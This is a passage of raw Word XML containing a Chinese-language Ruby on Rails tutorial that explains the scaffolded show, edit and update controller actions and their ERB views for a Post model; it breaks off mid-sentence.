      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5856"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="2CF6C5A6" w14:textId="77777777" w:rsidTr="004713D8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7B72450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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>show</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69CFC90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@post</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6360127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77B25CC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respond_to do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="109DA1C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format.html  # show.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A52EE7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format.json  { render :json</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @post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2A91EE3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3B6BADC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12092BA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这里的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>show</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Post.find</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 通过对应记录的id来查找单个记录。当找到记录，Rails使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>app/views/posts/show.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来显示它：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="6407CDCE" w14:textId="77777777" w:rsidTr="002A2B82">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04DD526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w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>id="notice"&gt;&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>notice %&gt;&lt;/p&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39B023D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355C062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266533E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&lt;b&gt;Name:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1385ED8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@post.name %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13F72DF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0CAC0EB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3FBE3B9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0001861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&lt;b&gt;Title:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5581356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@post.title %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58EBB57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659CC11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49A9423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7D5CFE4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&lt;b&gt;Content:&lt;/b&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7394F27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@post.content %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3427A4D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6FEC8B1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60A03B1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7E08678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'Edit', edit_post_path(@post) %&gt;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2378956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'Back', posts_path %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1A6F45AF"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9.11 编辑Posts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D108F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类似创建一个新的 post，编辑一个 post 分为两部分。首先是到 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>edit_post_path(@post)</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 请求一个特定的 post。这里是调用的在 controller 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>edit</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4296"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="3205C630" w14:textId="77777777" w:rsidTr="004713D8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2352B78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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>edit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3757021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@post</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FF9177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2290DB62"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再找到了请求的 post， Rails 试图使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>edit.html.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来显示它：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4176"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="7282A39A" w14:textId="77777777" w:rsidTr="004713D8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A3CFE1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&lt;h1&gt;Editing post&lt;/h1&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00EBA64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render 'form'</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6B55911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'Show', @post</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4CABB66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'Back', posts_path %&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="18CB3EA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再一次的，就像 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action，</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>edit</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action也使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> partial，这次有所不同，form将会提交一个PUT action到 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>PostsController</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 并且提交按钮将会显示为 “Update Post”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="482EB81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提交的form由上面这个视图创建的并且还会调用 controller 中的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>update</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="6EF298B0" w14:textId="77777777" w:rsidTr="004713D8">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="435887F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def</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>update</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3665117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@post</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>= Post.find(params[:id])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E5C741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1BDEC9D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respond_to do</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|format|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CF0E52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if</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>@post.update_attributes(params[:post])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5094435D" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="004713D8">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>      format.html  { redirect_to(@post,</w:t>
            </w:r>
            <w:r w:rsidR="004713D8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>:notice</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'Post was successfully updated.') }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62E92F1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format.json  { head :no_content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26C032D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else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="366B1F6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format.html  { render :action</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "edit"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46A055DC" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="004713D8">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>      format.json  { render :json</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; @post.errors,</w:t>
            </w:r>
            <w:r w:rsidR="004713D8">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>:status</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :unprocessable_entity</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100AAF8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04FD1A1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7CDE15A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6BD8881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在 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>update</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> action中，Rails 首先使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:id</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数从 edit view（传值到）数据库记录下刚才编辑的内容。当获取了请求的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>post</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> parameter（一个hash字典）就会 call </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
